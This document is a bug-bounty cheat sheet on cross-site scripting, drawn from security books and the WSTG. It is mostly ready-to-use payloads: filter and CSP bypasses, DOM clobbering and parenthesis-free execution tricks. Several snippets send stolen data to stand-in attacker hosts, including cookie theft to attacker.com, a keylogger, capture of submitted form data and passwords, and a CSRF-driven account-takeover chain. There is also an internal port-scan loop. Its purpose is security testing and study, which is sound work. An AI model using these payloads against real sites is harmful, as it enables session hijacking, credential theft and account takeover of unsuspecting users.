# Cross-Site Scripting (XSS)
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), JavaScript for Hackers, WSTG v4.2

## Types of XSS

| Type | Stored | Trigger | Severity |
|---|---|---|---|
| Reflected | No (URL param) | Victim must click link | Medium |
| Stored (Persistent) | Yes (DB/file) | Every visitor to page | High |
| DOM-based | No (JS processes input) | Victim visits crafted URL | Medium |
| Blind | Yes (logs/admin panel) | Unknown victim (admin) | High |
| Self-XSS | No | Social engineering required | Low |

## Finding XSS

### Attack Surface — Where to Look
- URL parameters, form fields, HTTP headers (User-Agent, Referer, X-Forwarded-For)
- JSON API responses rendered as HTML
- File names (in upload forms), stored data (comments, profiles, usernames, bios)
- Cookie values reflected in page, custom error messages, email templates
- Chat messages, report titles, log entries displayed to admins
- WebSocket messages, postMessage data

### Testing Methodology
1. Enter unique string `xsstest123` in every input — observe where it appears in response
2. Determine context: raw HTML? HTML attribute? JS string? URL? JSON?
3. Craft payload for that context
4. Test for filters: try basic payload, observe what's blocked/encoded, find bypass
5. Check if CSP is present (DevTools → Network → response headers)

### Identifying Reflection Context
```
<html>INJECTION</html>               → HTML context
<tag attr="INJECTION">               → Attribute context (double quote)
<tag attr='INJECTION'>               → Single-quote attribute context
<script>var x="INJECTION"</script>   → JavaScript string context
<!-- INJECTION -->                   → HTML comment context
<a href="INJECTION">                 → href attribute (javascript: protocol)
```

---

## Core Payloads

### Basic Test Strings
```javascript
<script>alert(1)</script>
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
```

### Event Handlers (Auto-fire — No User Interaction Required)
```html
<!-- JavaScript for Hackers: no-interaction payloads -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>         <!-- HTML5 details element -->
<details ontoggle=alert(1) open>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<x onfocus=alert(1) autofocus tabindex=1>
<body onpageshow=alert(1)>

<!-- Requires user interaction -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe onload=alert(1) src="about:blank">
<marquee onstart=alert(1)>
```

### Popover XSS (HTML5) — JavaScript for Hackers
```html
<button popovertarget=x>Click</button>
<input type=hidden id=x onbeforetoggle=alert(1) popover>
<!-- Triggers on button click without direct event on input -->
```

### Hidden Input XSS (accesskey bypass)
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
<!-- User presses ALT+SHIFT+X (Chrome) or ALT+X (Firefox) -->
```

---

## Filter Bypass Techniques

### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### HTML Entity Encoding
```html
<a href="&#106;avascript:alert(1337)">click</a>       <!-- decimal entity -->
<a href="&#x6a;avascript:alert(1337)">click</a>       <!-- hex entity -->
<a href="javascript&colon;alert(1337)">click</a>      <!-- HTML5 named entity -->
<a href="javascript:alert&grave;1337&grave;">click</a>  <!-- backtick via entity -->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

### Whitespace / Null Byte
```html
<script>/*%00*/alert(1)</script>
<img src="java\0script:alert(1)">
<a href="java&#9;script:alert(1)">    <!-- tab -->
<a href="java&#10;script:alert(1)">   <!-- newline -->
<a href="java&#13;script:alert(1)">   <!-- carriage return -->
java&#x09;script:alert(1)
java&#x0A;script:alert(1)
java&#x0D;script:alert(1)
JaVaScRiPt:alert(1)
```

### Tag Alternatives (when `<script>` blocked)
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<math><mtext></table><img src=1 onerror=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<svg><animate onbegin=alert(1) attributeName=x>
<math><a xlink:href="javascript:alert(1)">XSS</a></math>
```

### Encoding Stacks
```
Double URL encode:  %253Cscript%253E  → %3Cscript%3E → <script>
HTML + URL encode:  &#60;script&#62;
HTML + double encode: &lt;script&gt; (depends on double-decoding)
```

### Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Broken Tags (mutation XSS)
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

## Calling Functions Without Parentheses — JavaScript for Hackers

These bypass filters that block `(` or `)`:
```javascript
// Backtick template literals
alert`1337`
setTimeout`alert\x281337\x29`

// onerror + throw
onerror=alert;throw 1337
throw onerror=alert,1337
<img src=x onerror="throw onerror=alert,1337">
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>

// Tagged templates with eval
Function`x${'alert\x281337\x29'}```

// Symbol.hasInstance
'alert\x281337\x29'instanceof{[Symbol.hasInstance]:eval}

// Reflect.apply
Reflect.apply.call`${alert}${window}${[1337]}`

// valueOf hack
window.valueOf=alert;window+1

// window['alert']
<img src=x onerror=window['alert'](1)>
```

---

## DOM Clobbering — JavaScript for Hackers

Override `window` properties using named HTML elements:
```html
<!-- Level 1: window.x -->
<img id=x>
<!-- window.x === <img id=x> -->

<!-- Level 2: window.x.y (form + named child) -->
<form id=x name=y></form>
<!-- window.x.y === <form name=y> -->

<!-- Level 3: window.x.y.z via input value -->
<form id=x name=y><input id=z value=1337></form>
<!-- window.x.y.z.value === "1337" -->

<!-- Level 4: using anchors for href -->
<a id=config href="javascript:alert(1)">
<!-- config.href === "javascript:alert(1)" -->
```

Clobbering `document.getElementById`:
```html
<!-- If code does: let x = document.getElementById('config') -->
<form id=config>
<input id=config name=url value="javascript:alert(1)">
```

Exploitation: If code does `eval(config.url)`, clobbering `config` gives XSS.

---

## Non-Alphanumeric JavaScript (JSFuck) — JavaScript for Hackers

Execute JS with only `[]()!+`:
```javascript
// alert(1) in JSFuck — use http://www.jsfuck.com/ to generate
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]...
```

---

## DOM XSS

### Sources (attacker-controlled)
```javascript
document.URL, document.documentURI, location.href, location.hash
location.search, document.referrer, window.name
postMessage data (if not validated)
```

### Sinks (dangerous functions)
```javascript
// HTML sinks (most dangerous)
document.write(), document.writeln()
element.innerHTML, element.outerHTML
element.insertAdjacentHTML()
$.html(), $(selector).html(), $('#div').append()

// JavaScript execution sinks
eval(), setTimeout(string), setInterval(string), Function(string)

// URL-based sinks
location.href, location.replace(), location.assign()
element.setAttribute('href', ...), element.setAttribute('src', ...)
window.open()
```

### Finding DOM XSS
```bash
# Search JS for sources flowing to sinks
grep -r "document.write\|innerHTML\|outerHTML\|eval(" js/

# Automated: DOMInvader (Burp Suite Pro extension) — automatically traces sources → sinks
# Chrome DevTools: Sources → Search → find sink functions → add breakpoints
```

---

## Blind XSS

```html
<!-- Out-of-band payload — fires when admin views logs/reports -->
<script src="https://your-server.com/xss.js"></script>
<img src="https://your-server.com/xss?cookie=" onerror="this.src+document.cookie">
<img src=x onerror="fetch('//your-server.com/log?cookie='+btoa(document.cookie)+'&url='+btoa(document.URL))">
<script src=//xsshunter.com/yourpayload></script>

<!-- XSS Hunter auto-captures: cookies, DOM, screenshots, origin URL -->
```

---

## CSP Bypass Techniques

```javascript
// If CSP has nonce but reflects nonce in response:
<script nonce="NONCE_VALUE">alert(1)</script>

// If CSP allows cdn.example.com and JSONP endpoint exists:
<script src="https://cdn.example.com/jsonp?callback=alert(1337)//"></script>

// Angular sandbox bypass (if Angular whitelisted in CSP):
{{constructor.constructor('alert(1)')()}}

// base-uri bypass: inject <base href> to control relative imports
<base href="https://attacker.com/">

// If CSP uses 'strict-dynamic': old-style nonce bypass doesn't work
// Focus on script gadgets (existing trusted scripts that eval user data)
```

---

## XSS to Account Takeover Chain

```javascript
// Step 1: XSS fires, steal CSRF token
fetch('/profile').then(r=>r.text()).then(html=>{
  let token = html.match(/csrf_token.*?value="([^"]+)"/)[1];
  // Step 2: Use CSRF token to change email
  return fetch('/profile/update', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `email=attacker@evil.com&csrf_token=${token}`
  });
}).then(()=>new Image().src='https://attacker.com/done');
// Step 3: Use password reset with new email to take over account
```

## XSS Impact Escalation

```javascript
// Steal session cookie (if not HttpOnly)
new Image().src='https://attacker.com/?c='+document.cookie

// Keylogger
document.addEventListener('keypress', e => new Image().src='https://attacker.com/?k='+e.key);

// Capture form data (password fields)
document.querySelector('form').addEventListener('submit', e => {
  let data = new FormData(e.target);
  fetch('https://attacker.com/', {method:'POST', body: [...data.entries()]});
});

// Screenshot via html2canvas
let s=document.createElement('script');
s.src='https://html2canvas.hertzen.com/dist/html2canvas.min.js';
s.onload=()=>html2canvas(document.body).then(c=>new Image().src='https://attacker.com/?img='+c.toDataURL().slice(0,300));
document.head.appendChild(s);

// Port scan internal network via XSS
for(var i=1; i<=65535; i++){
  var img=new Image();
  img.src='http://192.168.1.1:'+i;
}

// Read CSRF token from DOM, perform state-changing request
```

## Real-World XSS Examples (Yaworski)

- **Shopify** ($2,500): XSS through file upload widget rendered in admin panel
- **Yahoo! Mail** ($10,000): Stored XSS via crafted email — affected all Yahoo! Mail users
- **Google** (multiple): DOM XSS via `#fragment` processed by JS without sanitization
- **United Airlines** (miles): XSS in loyalty program portal

## Severity
- **Critical**: Stored XSS on high-traffic page stealing admin session → full ATO
- **High**: Stored XSS stealing user session cookies
- **Medium**: Reflected XSS requiring victim to click link
- **Low**: Self-XSS (only affects own account), sandboxed iframe XSS
